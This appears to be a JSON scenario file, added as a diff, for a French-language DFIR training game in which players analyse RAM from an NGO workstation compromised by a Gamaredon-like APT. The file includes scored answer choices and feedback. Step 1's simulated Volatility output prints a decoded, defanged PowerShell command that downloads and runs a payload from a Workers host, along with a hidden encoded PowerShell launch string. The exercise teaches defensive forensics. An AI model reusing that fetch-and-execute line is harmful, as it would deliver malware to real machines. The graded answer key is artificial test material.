@@ -1,0 +1,159 @@
+{
+  "id": "ads-2-clean-vraiment",
+  "title": "Le compartiment fantôme — Acte 2 : « Clean », vraiment ?",
+  "icon": "🔍",
+  "difficulty": "hard",
+  "atmosphere": "incident",
+  "narrative": {
+    "success": "Vous avez résisté au piège du « clean ». L'analyse RAM Volatility révèle un process orphelin injecté dans un explorer.exe légitime — schtasks.exe lancé depuis un parent inattendu. Le hash du process en mémoire ne correspond pas au binaire sur disque (preuve d'injection). YARA confirme des signatures Gamaredon. L'incident est requalifié en « APT compatible Gamaredon, sous analyse complémentaire ».",
+    "degraded": "Vous avez fait l'analyse mais avec des outils limités (pas de Volatility plugin spécifique Gamaredon — analyse manuelle plus longue). Les signaux APT sont détectés mais l'attribution reste en hypothèse, l'investigation est ralentie de 24-48h.",
+    "failure": "Vous avez accepté le rapport AV comme parole d'évangile. Pas d'analyse RAM approfondie, pas de YARA scan custom, pas de comparaison hash mémoire vs disque. L'attaquant continue à opérer pendant ce temps. Quand l'incident sera détecté à nouveau dans 3 semaines, l'exfiltration aura été massive."
+  },
+  "tags": [
+    "ANALYSE RAM",
+    "VOLATILITY",
+    "PROCESS INJECTION",
+    "MITRE T1055",
+    "MALWARE DORMANT",
+    "ANTIVIRUS FALSE NEGATIVE",
+    "MEMOIRE FORENSIQUE",
+    "INDICATEURS COMPROMISSION"
+  ],
+  "legalRefs": [
+    "Art. 143bis CP — Accès indu à un système informatique",
+    "Art. 144bis CP — Détérioration de données",
+    "Art. 263 CPP — Séquestre",
+    "Art. 271 CPP — Présence du défenseur en cas d'audition (non applicable ici, mais à anticiper)",
+    "ISO/IEC 27037 — Préservation des preuves numériques",
+    "NIST SP 800-86 — Forensic techniques into incident response",
+    "MITRE ATT&CK Enterprise — T1055 Process Injection, T1059.005 VBScript"
+  ],
+  "intro": "Vendredi 16 janvier 2026, 09h15. Lab forensique Polcant VD, Renens. L'image RAM (12 Go) et l'image disque (256 Go) acquises hier sur le poste de l'ONG Solidarité Dnipro sont prêtes pour analyse. Le rapport préliminaire de Bitdefender (envoyé en milieu d'après-midi hier par Hélène Bourquin avec son accord) dit clean : aucune signature détectée, score de risque 0/100. Insp. Lara Schmidlin (analyste RAM) vous accompagne. La directrice de l'ONG attend des nouvelles — elle a coupé Outlook, l'organisation tourne en mode dégradé. Vous savez intuitivement que ce n'est pas clean.",
+  "alertLevel": "⚠️ AV REPORT : CLEAN · RAM 12 Go disponible · Disk 256 Go prêt · APT suspect Gamaredon · Pression organisationnelle ONG : 48h max avant remise en service",
+  "objectives": [
+    {
+      "icon": "🧠",
+      "text": "Conduire l'analyse RAM Volatility pour repérer process injection et persistance"
+    },
+    {
+      "icon": "🔬",
+      "text": "Comparer hash mémoire vs hash disque pour identifier injections de code"
+    },
+    {
+      "icon": "📋",
+      "text": "Identifier les TTP MITRE ATT&CK compatibles Gamaredon avant attribution formelle"
+    },
+    {
+      "icon": "📞",
+      "text": "Communiquer à Hélène Bourquin un état d'avancement clair sans céder à la pression de délai"
+    }
+  ],
+  "debrief": "<p>L'acte 2 d'une saga APT est celui où l'on apprend à ne pas faire confiance aux outils commerciaux. Un AV qui dit clean sur un poste compromis par APT étatique n'est pas une anomalie — c'est la règle. Trois raisons :</p><p><strong>Raison 1 — Le malware moderne est polymorphe et signé.</strong> Gamaredon et autres APT contemporains : (a) recompilent leurs binaires à chaque campagne (signature unique), (b) utilisent des certificats valides (achetés ou volés à de vraies entreprises), (c) exploitent des LOLBins (Living Off the Land Binaries — schtasks.exe, mshta.exe, regsvr32.exe — outils Windows légitimes) au lieu de déposer leur propre binaire. Bitdefender ne peut pas signaler comme malveillant un schtasks.exe qui est un binaire Microsoft signé.</p><p><strong>Raison 2 — Le comportement compte plus que la signature.</strong> Là où l'AV échoue, le SIEM ou l'EDR réussit (Sysmon, Microsoft Defender for Endpoint, Crowdstrike Falcon). Le critère n'est plus « ce binaire est-il dans ma base de signatures ? » mais « ce binaire fait-il quelque chose d'anormal vu son rôle habituel ? » Exemple : explorer.exe qui lance powershell.exe avec une commande encodée base64 vers une URL Telegram = anomalie comportementale typique, indépendamment des signatures.</p><p><strong>Raison 3 — L'analyse RAM révèle ce que l'AV ignore.</strong> Volatility est l'outil de référence (Volatility 3 stable en 2026). Plugins clés pour APT : <code>pslist</code> + <code>pstree</code> (arbre des processus — repérer schtasks.exe lancé par explorer.exe = anormal), <code>malfind</code> (sections de code injectées en mémoire — détection process injection), <code>cmdline</code> (lignes de commande des processus — souvent base64 obfusquées chez Gamaredon), <code>netscan</code> (connexions réseau actives au moment du dump RAM — Telegram bot et Cloudflare workers).</p><p><strong>Process injection — T1055 MITRE.</strong> L'attaquant injecte son code dans un processus légitime (explorer.exe, svchost.exe) pour : (a) éviter détection AV (le processus malveillant n'a pas son propre PID, il vit dans un PID légitime), (b) hériter des privilèges du processus hôte, (c) survivre à la fermeture du programme malveillant initial. Détection : comparer le hash SHA-256 du binaire de explorer.exe sur le disque vs le hash de l'image mémoire du processus en cours d'exécution. Si différent → injection. C'est ainsi qu'on attrape les malware « in memory only » qui ne touchent jamais le disque.</p><p><strong>Pression organisationnelle — un classique des incidents APT.</strong> Hélène Bourquin a une ONG à faire tourner. Tous les jours d'arrêt = patients ukrainiens qui ne reçoivent pas de soins, donateurs qui s'inquiètent, médias qui pourraient s'en mêler. Elle va exercer une pression légitime pour « remettre en service au plus vite ». Le rôle du DFIR n'est PAS de céder à cette pression (un poste réinjecté en LAN avant éradication complète = compromission durable), mais d'expliquer clairement : (a) ce qu'on sait, (b) ce qu'il reste à analyser, (c) le calendrier réaliste, (d) les mesures de mitigation temporaires (poste isolé, accès cloud verrouillé, multifactor renforcé sur tous les comptes).</p><p><strong>Références</strong> : Volatility Foundation documentation, MITRE ATT&CK T1055 / T1027, Sekoia TDR rapports Gamaredon 2024-2026, NIST SP 800-86.</p>",
+  "steps": [
+    {
+      "phase": "🧠 09h30 — Démarrage analyse RAM Volatility",
+      "situation": "Image RAM montée en lecture seule. Profile Windows détecté automatiquement par Volatility 3. Premiers plugins lancés :<br><br>\n<div style=\"background:rgba(0,0,0,.35);border:1px solid var(--border);border-radius:8px;padding:.85rem 1rem;font-size:.8rem;line-height:1.8\">\n<strong>Sorties Volatility préliminaires :</strong><br><br>\n📊 <code>windows.pslist</code> : 87 processus actifs au moment du dump<br>\n📊 <code>windows.pstree</code> : arbre généalogique. Anomalie repérée :<br>\n→ explorer.exe (PID 3128) — normal (lancé par userinit.exe)<br>\n  → schtasks.exe (PID 4892) — <strong>ANORMAL</strong> (en théorie schtasks.exe est lancé par services.exe ou par cmd.exe lors d'utilisation manuelle, pas par explorer.exe directement)<br>\n  → cmd.exe (PID 5104)<br>\n    → powershell.exe (PID 5200) — ligne de commande encodée base64<br>\n<br>\n📊 <code>windows.cmdline</code> sur PID 5200 :<br>\n<code>powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYg…(tronqué)</code><br>\n<br>\n📊 Décodage base64 manuel :<br>\n<code>Invoke-WebRequest -Uri 'hxxps://wnoufqebrm.workers.dev/d8s9' -OutFile $env:TEMP\\update.dat; Start-Process $env:TEMP\\update.dat</code><br>\n<br>\n🚨 Ce qu'on voit : powershell téléchargeant un fichier depuis un Cloudflare Worker domain (typique Gamaredon C2), puis exécution. Le workers.dev est un canal C2 documenté Gamaredon depuis 2023.\n</div>",
+      "law": "<strong>MITRE ATT&CK</strong> — T1059.001 PowerShell, T1027 Obfuscated Files (base64), T1071.001 Web Protocols (Cloudflare Worker), T1053.005 Scheduled Task (schtasks.exe).<br><strong>ISO/IEC 27037</strong> — Préservation de l'image RAM en lecture seule.<br><strong>Volatility 3 documentation</strong> — Bonnes pratiques d'analyse.",
+      "question": "<strong>Quelles sont vos 3 prochaines actions d'analyse après cette première découverte ?</strong>",
+      "choices": [
+        {
+          "text": "(1) <code>windows.malfind</code> sur PID 3128 (explorer.exe) — détecter si du code a été injecté dans le processus légitime. Vérifier toutes les sections RWX (Read-Write-Execute, signature de shellcode injecté). (2) <code>windows.netscan</code> pour identifier les connexions réseau actives au moment du dump — confirmation du C2 Telegram/Cloudflare, IP source/dest, ports. (3) Export du PID 5200 (powershell.exe malveillant) via <code>windows.dumpfiles</code> pour analyse statique externe + scan YARA avec règles Gamaredon publiques (Sekoia, ESET, Mandiant). (4) En parallèle : extraire le binaire `update.dat` du disque (si toujours présent dans %TEMP%) et hash + soumission VirusTotal en privé (option « do not share », important pour ne pas alerter l'attaquant qui surveille VT).",
+          "ok": true,
+          "pts": 30,
+          "fb": "Plan d'analyse RAM exemplaire. (1) <code>malfind</code> est LE plugin clé pour détecter process injection — il identifie les sections mémoire RWX qui sont anormales dans un processus legit comme explorer.exe. (2) <code>netscan</code> sur l'image RAM révèle l'état réseau au moment du dump — important pour confirmer le C2 actif. (3) <code>dumpfiles</code> + scan YARA avec règles publiques Gamaredon est la voie d'attribution rigoureuse — pas une attribution sauvage, mais une comparaison signatures connues. (4) Le détail critique « VirusTotal en privé » est de niveau senior : si on soumet en public, l'attaquant qui surveille VT (pratique standard APT) saura immédiatement qu'il est repéré et déclenchera son protocole de nettoyage / changement d'infrastructure. La règle est « ne JAMAIS soumettre un IOC d'attaquant actif en public ». Gamaredon (G0047 MITRE) est documenté depuis 2014 par CERT-UA, Mandiant, ESET, Sekoia. Sa <strong>signature distinctive</strong> : commodity tooling + intensité opérationnelle élevée + cibles humanitaires/gouvernementales pro-UA. La convergence des indices construit l'attribution. <strong>À retenir</strong> : chaque décision opérationnelle doit pouvoir être justifiée par écrit, motivée juridiquement, et soutenir un contrôle a posteriori par la juridiction de jugement.",
+          "legal": "Méthodologie d'analyse RAM modèle. ISO/IEC 27037 respecté. MITRE ATT&CK techniques identifiées et confirmées.",
+          "critical": false,
+          "next": 1
+        },
+        {
+          "text": "Je soumets immédiatement le powershell.exe extrait à VirusTotal public, ainsi que l'URL Cloudflare Worker — comme ça la communauté threat intel mondiale peut nous aider à identifier le malware plus vite.",
+          "ok": false,
+          "pts": -25,
+          "fb": "Erreur tactique très commune. (1) Les opérateurs APT (Gamaredon inclus) surveillent VirusTotal en temps réel pour leurs propres IOC — c'est documenté depuis ~2017. Une soumission publique alerte l'attaquant en quelques minutes. (2) Conséquences : l'attaquant change immédiatement de Cloudflare Worker (workers.dev gratuit et illimité), de bot Telegram, et active sa routine de nettoyage sur les postes compromis (suppression des persistances, effacement de logs). Vous venez de détruire 80% de votre fenêtre d'investigation. (3) Bonne pratique : (a) VT en mode privé (option payante mais standard pour DFIR pro), (b) partage via canaux fermés MISP/STIX avec OFCS / OFCS / GovCERT, (c) coordination avec Mandiant/Sekoia/ESET via canaux directs threat intel. Avec un APT étatique sophistiqué, <strong>chaque erreur coûte cher</strong> : l'attaquant détecte votre éviction → bascule infrastructure → on perd la traçabilité de mois d'enquête. La règle d'or : ne PAS alerter l'attaquant tant que les preuves ne sont pas consolidées ET les contre-mesures déployées. <strong>À retenir</strong> : les erreurs critiques en début d'enquête sont rarement rattrapables — elles contaminent toute la chaîne de preuves. La rigueur initiale = condition de la condamnation finale.",
+          "legal": "Art. 73 CPP — risque de violation du secret de l'enquête (les soumissions VT publiques sont visibles par tous, dont la presse cyber). Méthodologie d'attribution compromise.",
+          "critical": true,
+          "next": 1
+        },
+        {
+          "text": "On a assez d'éléments — c'est clairement Gamaredon vu les patterns. Je rédige immédiatement le rapport d'attribution APT pour le SRC et la presse, pour que tout le monde soit informé.",
+          "ok": false,
+          "pts": -25,
+          "fb": "Précipitation et sortie de rôle. (1) « Clairement Gamaredon » sur la base de schtasks.exe + powershell base64 + workers.dev : ces TTP sont compatibles avec Gamaredon, mais aussi avec d'autres APT (Turla, Sandworm utilisent des techniques similaires) ET avec des opérateurs criminels non-étatiques utilisant des kits Gamaredon-like. L'attribution requiert un faisceau de 5-8 TTP corroborants minimum, idéalement avec analyse statique du malware téléchargé. (2) Rapport au SRC en quelques heures sur une attribution sauvage = décrédibilisation pour les vrais incidents futurs. (3) « Presse » : VIOLATION explicite art. 73 CPP (secret enquête). Une enquête en cours sur APT étatique n'est jamais communiquée à la presse avant : (a) clôture procédurale, ou (b) décision politique d'attribution publique au niveau fedpol/SRC, jamais au niveau enquêteur cantonal. Avec un APT étatique sophistiqué, <strong>chaque erreur coûte cher</strong> : l'attaquant détecte votre éviction → bascule infrastructure → on perd la traçabilité de mois d'enquête. La règle d'or : ne PAS alerter l'attaquant tant que les preuves ne sont pas consolidées ET les contre-mesures déployées. <strong>À retenir</strong> : les erreurs critiques en début d'enquête sont rarement rattrapables — elles contaminent toute la chaîne de preuves. La rigueur initiale = condition de la condamnation finale.",
+          "legal": "Art. 73 CPP violé (communication presse). LRens — qualification d'attribution prématurée. Risque disciplinaire et de décrédibilisation institutionnelle.",
+          "critical": true,
+          "next": 1
+        }
+      ]
+    },
+    {
+      "phase": "🔬 11h00 — malfind et hash comparison",
+      "situation": "Volatility <code>malfind</code> a tourné. Résultat :<br><br>\n<div style=\"background:rgba(0,0,0,.35);border:1px solid var(--border);border-radius:8px;padding:.85rem 1rem;font-size:.8rem;line-height:1.8\">\n<strong>Sortie windows.malfind :</strong><br><br>\n🚨 PID 3128 (explorer.exe) : 3 sections RWX trouvées :<br>\n→ Adresse 0x00007FFE12340000, taille 0x4000, signature MZ détectée (PE injecté !)<br>\n→ Adresse 0x00007FFE12350000, taille 0x2000, code assembleur shellcode-style<br>\n→ Adresse 0x00007FFE12360000, taille 0x1000, données chiffrées (entropie 7.92/8 — typique chiffrement)<br>\n<br>\n📊 Hash SHA-256 explorer.exe :<br>\n→ Sur disque (C:\\Windows\\explorer.exe) : <code>a3f9c2...</code> (correspond à la signature officielle Microsoft Windows 10 22H2)<br>\n→ En mémoire (PID 3128) : <code>e7b401...</code> (DIFFÉRENT — preuve d'injection)<br>\n<br>\n📊 YARA scan sur sections RWX :<br>\n→ Match Sekoia_Gamaredon_GammaLoad_2024 (yara rule publique)<br>\n→ Match Mandiant_PteroDo_loader_v3 (yara rule semi-publique partenaire)<br>\n→ Match ESET_GammaSteel_decoder (yara rule académique)<br>\n<br>\n🎯 Conclusion technique : process injection T1055 confirmée. Loader Gamaredon (compatible GammaLoad ou PteroDo). Persistance via schtasks.exe créée à l'exécution. C2 via Cloudflare Workers (workers.dev) avec exfiltration probable.\n</div>",
+      "law": "<strong>MITRE ATT&CK</strong> — T1055 Process Injection, T1055.012 Process Hollowing (sous-technique possible).<br><strong>LRens</strong> — Signalement SRC : éléments désormais qualifiants.<br><strong>LSI</strong> — Annonce OFCS déjà faite, à mettre à jour avec ces nouveaux éléments.",
+      "question": "<strong>Vous avez maintenant les TTP qualifiantes. Quelle est la suite : attribution formelle, communication, ou poursuite analyse ?</strong>",
+      "choices": [
+        {
+          "text": "Approche graduée : (1) Rapport technique détaillé à OFCS / GovCERT et SRC : 5 TTP MITRE ATT&CK identifiées avec confidence haute (T1566.001 phishing, T1059.001 powershell, T1027 obfuscation base64, T1055 process injection, T1071.001 web protocols). Match YARA 3 règles différentes — convergence forte. (2) Attribution = « compatible Gamaredon (G0047), confiance moyenne-haute, à confirmer par analyse complémentaire et corroboration cross-source ». Pas « certain » — il manque l'analyse du binaire downloadé update.dat (à extraire du disque) et l'analyse du trafic C2 réel. (3) Communication : pas de presse, pas de communication publique. OFCS peut alerter d'autres ONG aux profils similaires (par canaux fermés MISP via OFCS) sans nommer la victime. (4) Décision continue : poursuivre acte 3 (analyse trafic réseau capturé) pour confirmation finale.",
+          "ok": true,
+          "pts": 30,
+          "fb": "Calibrage parfait. « Compatible Gamaredon, confiance moyenne-haute, à confirmer » est exactement le niveau d'attribution que demande une enquête sérieuse à ce stade. Vous avez beaucoup d'éléments (3 YARA, 5 TTP, process injection confirmée, C2 typique), mais vous laissez ouverte la possibilité d'un copy-cat ou d'un false flag jusqu'à corroboration finale. Le OFCS peut activer une alerte sectorielle sur les ONG humanitaires soutenant l'UA via canaux fermés (OFCS / OFCS partage MISP) — utile pour la communauté sans compromettre votre enquête. La discipline d'éviter la presse est cruciale : Gamaredon lit Le Temps et Tagesanzeiger autant que vous. Gamaredon (G0047 MITRE) est documenté depuis 2014 par CERT-UA, Mandiant, ESET, Sekoia. Sa <strong>signature distinctive</strong> : commodity tooling + intensité opérationnelle élevée + cibles humanitaires/gouvernementales pro-UA. La convergence des indices construit l'attribution. <strong>À retenir</strong> : chaque décision opérationnelle doit pouvoir être justifiée par écrit, motivée juridiquement, et soutenir un contrôle a posteriori par la juridiction de jugement.",
+          "legal": "LRens — signalement SRC qualifié. LSI — mise à jour OFCS. Art. 73 CPP — secret respecté. Méthodologie d'attribution rigoureuse.",
+          "critical": false,
+          "next": 2
+        },
+        {
+          "text": "Attribution formelle Gamaredon = confirmée. Communication OFCS + SRC + fedpol + presse + MFA (vu la dimension Russie/Ukraine, le Département fédéral des affaires étrangères doit être impliqué pour potentielle convocation de l'ambassadeur). On va le grand jeu.",
+          "ok": false,
+          "pts": -25,
+          "fb": "Sur-escalade. (1) « Attribution formelle confirmée » : pas encore — on a 3 YARA et 5 TTP, mais on n'a pas encore analysé le binaire update.dat ni le trafic C2 réel. Un faux drapeau (un autre groupe utilisant des outils Gamaredon-like volontairement pour brouiller) est encore plausible. (2) DFAE et convocation d'ambassadeur sont des décisions politiques au niveau Conseil fédéral / DFAE, jamais déclenchées par un enquêteur cantonal sur la base d'une enquête en cours. Ces décisions arrivent éventuellement APRÈS jugement, et même là sont rares. (3) Presse + tout le monde = explosion médiatique sans contrôle, alors qu'on est en phase d'enquête. La défense de l'ONG (Hélène Bourquin) serait dépassée par les médias, dégradant sa capacité opérationnelle. Avec un APT étatique sophistiqué, <strong>chaque erreur coûte cher</strong> : l'attaquant détecte votre éviction → bascule infrastructure → on perd la traçabilité de mois d'enquête. La règle d'or : ne PAS alerter l'attaquant tant que les preuves ne sont pas consolidées ET les contre-mesures déployées. <strong>À retenir</strong> : les erreurs critiques en début d'enquête sont rarement rattrapables — elles contaminent toute la chaîne de preuves. La rigueur initiale = condition de la condamnation finale.",
+          "legal": "LRens — escalade incorrecte. Art. 73 CPP — violation du secret. DFAE — décision politique non-policière.",
+          "critical": true,
+          "next": 2
+        },
+        {
+          "text": "On a confirmation. Je termine l'analyse RAM, je rédige le rapport technique pour le procureur, et on attend les décisions hiérarchiques. Pas de communication, pas d'action, juste de la rigueur procédurale.",
+          "ok": false,
+          "pts": -10,
+          "fb": "Posture défensive qui sous-utilise les opportunités opérationnelles. (1) OFCS / GovCERT doit être informé pour qu'il puisse alerter les autres ONG potentiellement ciblées — c'est une obligation morale et la LSI le prévoit. (2) Le SRC peut commencer à corréler avec d'autres signalements suisses sur Gamaredon, ce qui peut accélérer l'attribution finale et nourrir l'analyse stratégique. (3) « Attendre les décisions hiérarchiques » : oui pour les décisions politiques (convocation ambassadeur), mais NON pour les actions opérationnelles techniques qui relèvent de votre rôle. La rigueur procédurale n'est pas la passivité — c'est savoir ce qu'on doit faire à son niveau et ce qu'on doit escalader. Option suboptimale plutôt que catastrophique. La bonne pratique privilégie l'approche qui minimise les risques juridiques ET maximise la qualité des preuves dès la première heure.",
+          "legal": "Pas d'illégalité, mais inefficacité opérationnelle. LSI — annonce OFCS à finaliser.",
+          "critical": false,
+          "next": 2
+        }
+      ]
+    },
+    {
+      "phase": "📞 14h00 — Communication Hélène Bourquin",
+      "situation": "Hélène Bourquin appelle. Elle a tenu jusqu'à présent mais l'ONG est en mode dégradé depuis 24h. « Insp.-chef, je dois prendre une décision pour demain matin : on remet le poste de Maria en service ou pas ? Sinon je dois acheter un poste neuf en urgence, ça va coûter 2000 CHF et retarder encore. Vous en êtes où ? »<br><br>\n<div style=\"background:rgba(0,0,0,.35);border:1px solid var(--border);border-radius:8px;padding:.85rem 1rem;font-size:.8rem;line-height:1.8\">\n<strong>État de l'investigation à 14h00 :</strong><br>\n✅ RAM analysée — process injection T1055 confirmée<br>\n✅ Match YARA Gamaredon (3 règles) — confidence moyenne-haute<br>\n⏳ Analyse disque en cours — schtasks.exe persistant à identifier<br>\n⏳ Capture PCAP analyse en cours (séance demain)<br>\n⏳ Binaire `update.dat` extrait à analyser statiquement<br>\n📋 OFCS informé, SRC en cours d'information<br>\n🎯 Estimation : 5-7 jours d'analyse complète avant remise en service possible<br><br>\n<strong>Question Hélène :</strong> « C'est combien de temps avant qu'on puisse reprendre le travail normalement ? Mes équipes sont coincées. »\n</div>",
+      "law": "<strong>Communication victime/témoin</strong> — Devoir d'information adéquate sans compromettre l'enquête.<br><strong>Art. 73 CPP</strong> — Secret de l'enquête : nuancer entre information factuelle et détails sensibles.<br><strong>Sécurité opérationnelle</strong> — Ne pas remettre en LAN un poste compromis avant éradication complète.",
+      "question": "<strong>Comment répondez-vous à Hélène Bourquin pour répondre à sa pression légitime sans céder ?</strong>",
+      "choices": [
+        {
+          "text": "« Hélène, je comprends la pression — voici où on en est. (1) Sur le poste de Maria : NE PAS REMETTRE en service. Compromission confirmée par notre analyse de ce matin. Détails techniques sensibles que je ne peux pas vous partager pour ne pas alerter l'attaquant. (2) Calendrier réaliste : 5-7 jours pour analyse complète + éradication + revérification. Je sais que c'est long, je suis désolé. (3) Mitigation à court terme : achetez un poste neuf pour Maria — 2000 CHF est rentable face au risque. Configurez avec MFA renforcé sur tous les comptes Office 365 (changement de tous les mots de passe depuis appareils externes à votre LAN, pas depuis des postes existants). Vérifiez les delegations Exchange et les forwards automatiques (Gamaredon les utilise souvent). (4) Mesures complémentaires : audit de tous les autres postes ONG pour signes similaires. OFCS peut vous appuyer techniquement gratuitement. (5) Je vous appelle demain à 14h pour update — entre temps, mon numéro direct si urgence : 021-XXX-XXXX. »",
+          "ok": true,
+          "pts": 30,
+          "fb": "Communication exemplaire avec une victime sous pression. Vous : (1) reconnaissez la pression sans la balayer, (2) donnez une instruction claire et motivée sans détails compromettants (« compromission confirmée » sans dire Gamaredon ou TTP), (3) proposez le calendrier réaliste sans le sous-estimer pour faire plaisir, (4) donnez des actions concrètes immédiates pour réduire le coût et le risque, (5) maintenez le canal ouvert (appel quotidien, ligne directe d'urgence). C'est la communication DFIR de niveau senior — Hélène repart avec un plan, pas une frustration. Le coût de 2000 CHF pour un poste neuf est rentable face à 50-200 KCHF de coût total d'une compromission durable. Gamaredon (G0047 MITRE) est documenté depuis 2014 par CERT-UA, Mandiant, ESET, Sekoia. Sa <strong>signature distinctive</strong> : commodity tooling + intensité opérationnelle élevée + cibles humanitaires/gouvernementales pro-UA. La convergence des indices construit l'attribution. <strong>À retenir</strong> : chaque décision opérationnelle doit pouvoir être justifiée par écrit, motivée juridiquement, et soutenir un contrôle a posteriori par la juridiction de jugement.",
+          "legal": "Art. 73 CPP — secret respecté (pas de partage de détails compromettants). Communication adéquate. Devoir d'information proportionné.",
+          "critical": false,
+          "next": -1
+        },
+        {
+          "text": "« On a confirmé qu'il s'agit de l'APT Gamaredon, attribué au FSB russe. Vous avez été ciblée par les services russes à cause de votre soutien à l'Ukraine. Je vais vous envoyer le rapport technique complet pour information. Remise en service possible probablement dans 10-15 jours. »",
+          "ok": false,
+          "pts": -25,
+          "fb": "Trois erreurs. (1) « Confirmé Gamaredon FSB » : vous donnez à Hélène une attribution non encore consolidée, qu'elle va partager (à son conseil d'administration, à ses donateurs, peut-être à un journaliste qu'elle connaît). En 24h, l'info sort, et Gamaredon sait qu'il est attribué — protocole de nettoyage activé chez l'attaquant. (2) « Rapport technique complet » à une victime non-DFIR : c'est inutile (elle ne lira pas), et c'est risqué (partage involontaire). (3) « 10-15 jours » : annonce inutilement large sans données pour justifier — Hélène va vous demander d'expliquer pourquoi c'est si long, ce qui force à partager plus d'info que vous ne devriez. La règle est : communication ciblée, motivée, mais sans détails compromettants. Option suboptimale plutôt que catastrophique. La bonne pratique privilégie l'approche qui minimise les risques juridiques ET maximise la qualité des preuves dès la première heure.",
+          "legal": "Art. 73 CPP violé (partage d'attribution avant qualification). Risque de fuite information.",
+          "critical": false,
+          "next": -1
+        },
+        {
+          "text": "« Je ne peux rien vous dire pour le moment, c'est le secret de l'enquête. Attendez nos instructions. »",
+          "ok": false,
+          "pts": -15,
+          "fb": "Refus de communication inapproprié. Le secret de l'enquête (art. 73 CPP) protège les détails sensibles, pas l'information opérationnelle de base que la victime a besoin de connaître pour ses décisions. Hélène ne demande pas des détails techniques — elle demande : remettre en service ou pas, et combien de temps. Lui refuser ces deux informations basiques : (1) la pousse à prendre des décisions à l'aveugle (probablement à remettre en service par défaut, ce qui ruine l'enquête), (2) dégrade la relation de coopération (essentielle pour les semaines à venir : elle a 14 employés à coordonner), (3) ne respecte pas le « devoir d'information adéquate » qui équilibre le secret de l'enquête. Communication adéquate = ce qu'elle a besoin de savoir pour ses décisions, pas les détails techniques. Option suboptimale plutôt que catastrophique. La bonne pratique privilégie l'approche qui minimise les risques juridiques ET maximise la qualité des preuves dès la première heure.",
+          "legal": "Art. 73 CPP — interprétation trop restrictive. Devoir d'information à la victime non respecté proportionnellement.",
+          "critical": false,
+          "next": -1
+        }
+      ]
+    }
+  ]
+}
